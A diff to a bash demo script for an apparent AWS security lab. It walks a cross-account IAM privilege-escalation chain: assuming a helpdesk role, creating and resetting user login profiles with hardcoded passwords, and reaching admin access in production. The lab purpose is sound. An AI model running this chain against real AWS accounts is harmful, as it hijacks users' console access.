@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -49,8 +51,38 @@ if ! aws sts get-caller-identity &> /dev/null; then
     exit 1
 fi
 
+# Retrieve readonly credentials for observation steps
+cd ../../../../../..  # Navigate to root of terraform project
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
+cd - > /dev/null
+
+# Credential switching helpers
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_starting_creds() {
+    # Restore ambient credentials by unsetting overrides
+    unset AWS_ACCESS_KEY_ID
+    unset AWS_SECRET_ACCESS_KEY
+    unset AWS_SESSION_TOKEN
+}
+
+echo -e "${GREEN}✓ Retrieved readonly credentials from Terraform${NC}"
+echo ""
+
+# [OBSERVATION] Step 1: Verify current identity
 echo -e "${YELLOW}Step 1: Verifying current identity${NC}"
-show_cmd aws sts get-caller-identity --output json
+show_cmd "Attacker" "aws sts get-caller-identity --output json"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --output json)
 echo "Current identity:"
 echo "$CURRENT_IDENTITY" | jq '.'
@@ -68,13 +100,14 @@ fi
 DEV_ACCOUNT_ID=$(echo "$CURRENT_IDENTITY" | jq -r '.Account')
 echo "Current account (dev): $DEV_ACCOUNT_ID"
 
+# [EXPLOIT] Step 2: Assume helpdesk role in dev
 echo -e "${YELLOW}Step 2: Assuming helpdesk role in dev${NC}"
 echo "Attempting to assume the pl-helpdesk role in dev account..."
 
 HELPDESK_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-helpdesk"
 echo "Attempting to assume role: $HELPDESK_ROLE_ARN"
 
-show_attack_cmd aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json"
 if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --role-session-name "helpdesk-session" --output json 2>&1); then
     echo -e "${GREEN}✓ Successfully assumed helpdesk role!${NC}"
     echo ""
@@ -89,11 +122,12 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
     export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
     export AWS_SESSION_TOKEN="$SESSION_TOKEN"
 
+    # [EXPLOIT] Step 3: Create login profile for Josh user (using helpdesk assumed-role creds)
     echo -e "${YELLOW}Step 3: Creating login profile for Josh user${NC}"
     echo "Using helpdesk role to create a login profile for pl-Josh user..."
 
     # Create a login profile for Josh user
-    show_attack_cmd aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required
+    show_attack_cmd "Attacker" "aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required"
     if aws iam create-login-profile --user-name "pl-Josh" --password "JoshPassword123!" --no-password-reset-required 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully created login profile for pl-Josh!${NC}"
         echo ""
@@ -115,6 +149,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
         unset AWS_SECRET_ACCESS_KEY
         unset AWS_SESSION_TOKEN
 
+        # [EXPLOIT] Step 5: Josh assumes trustsdev role in prod (using ambient/Josh creds)
         echo -e "${YELLOW}Step 5: Josh assumes trustsdev role in prod${NC}"
         echo "Josh (admin in dev) now assumes the pl-trustsdev role in prod..."
 
@@ -125,7 +160,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
 
         echo "Attempting to assume role: $TRUSTSDEV_ROLE_ARN"
 
-        show_attack_cmd aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json
+        show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json"
         if TRUSTSDEV_CREDENTIALS=$(aws sts assume-role --role-arn "$TRUSTSDEV_ROLE_ARN" --role-session-name "trustsdev-session" --output json 2>&1); then
             echo -e "${GREEN}✓ Successfully assumed trustsdev role in prod!${NC}"
             echo ""
@@ -140,17 +175,20 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
             export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
             export AWS_SESSION_TOKEN="$SESSION_TOKEN"
 
+            # [EXPLOIT] Step 6: Update Jeremy's login profile in prod (using trustsdev assumed-role creds)
             echo -e "${YELLOW}Step 6: Updating Jeremy's login profile in prod${NC}"
             echo "Using trustsdev role to update pl-Jeremy's login profile..."
 
             # Update Jeremy's login profile
-            show_attack_cmd aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required
+            show_attack_cmd "Attacker" "aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required"
             if aws iam update-login-profile --user-name "pl-Jeremy" --password "NewJeremyPassword123!" --no-password-reset-required 2>/dev/null; then
                 echo -e "${GREEN}✓ Successfully updated login profile for pl-Jeremy!${NC}"
                 echo ""
 
+                # [OBSERVATION] Step 7: Verify Jeremy's admin access
                 echo -e "${YELLOW}Step 7: Verifying Jeremy's admin access${NC}"
                 echo "Jeremy now has admin access in prod account..."
+                use_readonly_creds
 
                 # Verify Jeremy's access by checking his user info
                 if JEREMY_INFO=$(aws iam get-user --user-name "pl-Jeremy" 2>/dev/null); then
@@ -161,12 +199,12 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
 
                     # Test admin permissions
                     echo "Testing admin permissions..."
-                    show_cmd aws iam list-users --output json
+                    show_cmd "ReadOnly" "aws iam list-users --output json"
                     if aws iam list-users --output json > /dev/null 2>&1; then
                         echo -e "${GREEN}✓ Can list IAM users (admin permission confirmed)${NC}"
                     fi
 
-                    show_cmd aws s3 ls
+                    show_cmd "ReadOnly" "aws s3 ls"
                     if aws s3 ls > /dev/null 2>&1; then
                         echo -e "${GREEN}✓ Can list S3 buckets (admin permission confirmed)${NC}"
                     fi
